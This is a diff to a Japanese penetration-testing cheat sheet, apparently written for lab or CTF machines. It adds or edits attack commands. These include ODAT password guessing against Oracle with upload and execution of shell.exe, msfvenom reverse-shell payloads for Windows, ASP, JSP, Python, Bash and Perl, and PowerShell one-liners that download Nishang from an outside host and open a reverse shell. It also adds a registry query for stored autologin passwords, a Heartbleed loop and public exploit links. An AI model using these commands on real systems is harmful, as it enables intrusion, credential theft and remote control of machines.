@@ -906,12 +906,12 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
 C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
 ```
 
-#### RPCclient
+### RPCclient
 ```
 rpcclient -U "" -N 10.10.10.1
 ```
 
-#### CrackMapExec
+### CrackMapExec
 ```
 crackmapexec smb -L 
 crackmapexec 10.10.10.1 -u Administrator -H [hash] --local-auth
@@ -925,8 +925,7 @@ nmap --script smb-* -p 139,445, 10.10.10.1
 nmap --script smb-enum-* -p 139,445, 10.10.10.1
 ```
 
-
-### NetBIOS(139)
+## NetBIOS(139)
 NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。  
 最近のSMBの実装ではNetBIOSがなくても動作するが、NetBIOS over TCP(NBT)は後方互換性のために必要で、ともに有効になっている場合が多い。
 ```
@@ -937,6 +936,7 @@ NetBIOS情報を特定するための専門的ツール。オプション-rを�
 ```
 kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
 ```
+
 ## SNMP(161)
 SNMPはルータ、スイッチ、サーバなどのTCP/IPネットワークに接続された通信機器に対して、ネットワーク経由で監視、制御するためのUDPベースのアプリケーション層プロトコル。  
 SNMP1,2,2cではトラフィックの暗号化が行われていないため、SNMP情報や認証情報をローカルネットワーク上で傍受することができてしまう。  
@@ -1000,8 +1000,54 @@ iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable 
 iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86)
 ```
 
+## Oracle TNS Listener(1521)
+ODAT(Oracle Database Attacking Tool):  
+https://github.com/quentinhardy/odat
+```
+# install
+sudo pip3 install cx_Oracle
+sudo apt-get install python3-scapy
+sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
+sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
+```
+```
+# All Check
+python3 odat.py all -s 10.10.10.82 -p 1521
+
+# SIDの特定
+python3 odat.py sidguesser -s 10.10.10.82 -p 1521
+[+] SIDs found on the 10.10.10.82:1521 server: XE
+
+# 認証情報の特定(-dは特定したSIDを指定)
+python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE
+
+# 認証情報の特定(アカウントファイルの指定)
+ここではmetasploitのoracle用ファイルを使用
+ただし、ODATでは認証情報のファイルに「/」で区切ったものが必要なためEmacsなどでスペースと/を置き換える。
+python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file oracle_default_userpass.txt
+[+] Accounts found on 10.10.10.82:1521/sid:XE:
+scott/tiger
+
+# 権限の確認
+ファイルのアップロード権限(utlfile)や実行権限(externaltable)を列挙
+python3 odat.py all -s 10.10.10.82 -d XE -U scott -P tiger --sysdba
+
+# ペイロードのアップロード
+python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile "c:\Windows\Temp" "shell.exe" "shell.exe"
+[+] The shell.exe file was created on the c:\Windows\Temp directory on the 10.10.10.82 server like the shell.exe file
+
+# アップロードしたペイロードの実行
+python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec "C:\Windows\Temp" "shell.exe"
+[1] (10.10.10.82:1521): Execute the shell.exe command stored in the C:\Windows\Temp path
+```
+```
+# データベースへ接続
+sqlplus SCOTT/tiger@10.10.10.82:1521/XE
+# as sysdbaはOracle版sudo
+sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
+```
+
 ## MySQL(3306)
-ログイン
 ```
 mysql -u root -p
 mysql -u root -p -h <host name> -P <port number>
@@ -1131,9 +1177,9 @@ lient.Close()"
   
 ### Windows
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o reverse.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
 ```
 
 ### Linux
@@ -1151,35 +1197,35 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Numb
 
 ### asp/aspx
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > shell.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > shell.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > shell.aspx
 ```
 
 ### JSP
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > shell.jsp
 ```
 
 ### WAR
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > shell.war
 ```
 
 ### Python
 ```
-msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
+msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > shell.py
 ```
 
 ### Bash
 ```
-msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > shell.sh
 ```
 
 ### Perl
 ```
-msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > shell.pl
 ```
 
 ### Handlers(meterpreter)
@@ -2420,6 +2466,7 @@ reg query HKCU /f password /t REG_SZ /s
 ```
 # Windows autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 # VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -2719,11 +2766,6 @@ powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
 powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
 ```
 
-### ダウンロード&実行
-```
-powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
-```
-
 ### SMBを用いたファイル共有
 ```
 攻撃側(送信側):
@@ -2746,6 +2788,15 @@ dir /s /b flag*
 ```
 - /s...サブフォルダまで含めたファイルまで検索対象とする
 - /b...ファイル名だけ表示
+
+## cmd.exe
+### runas
+```
+# 保存されている認証情報を使用
+C:\Windows\System32\runas.exe runas /savecred /user:WORKGROUP\Administrator
+# 認証情報を入力
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "shell.exe"
+```
 
 ## PowerShell
 ### PowerShellスクリプトの実行
@@ -2784,8 +2835,10 @@ powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
 
 #### Nishang
 ```
-powershell IEX (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444
+# powershell.exe
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444
 
+# cmd.exe
 C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444 | powershell -noprofile -
 ```
 
@@ -2931,6 +2984,15 @@ https://www.exploit-db.com/exploits/35513
 pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection:  
 認証情報を知っていることが前提となる。
 https://www.exploit-db.com/exploits/43560
+
+Nibbleblog 4.0.3 - Arbitrary File Upload
+https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html
+
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
+https://www.exploit-db.com/exploits/32745
+Exploit-DBのものより、下記のエクスプロイトの方が使用しやすい
+https://gist.github.com/eelsivart/10174134
+for i in $(seq 1 100); do python2 heartbleed.py 10.10.10.79; done
 ```
 
 ## Privilege Escalation(Linux)
@@ -2974,6 +3036,9 @@ https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 
 Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010):
 https://github.com/worawit/MS17-010
+
+Achat 0.150 beta7 - Remote Buffer Overflow:  
+https://www.exploit-db.com/exploits/36025
 ```
 
 ## Privilege Escalation(Windows)
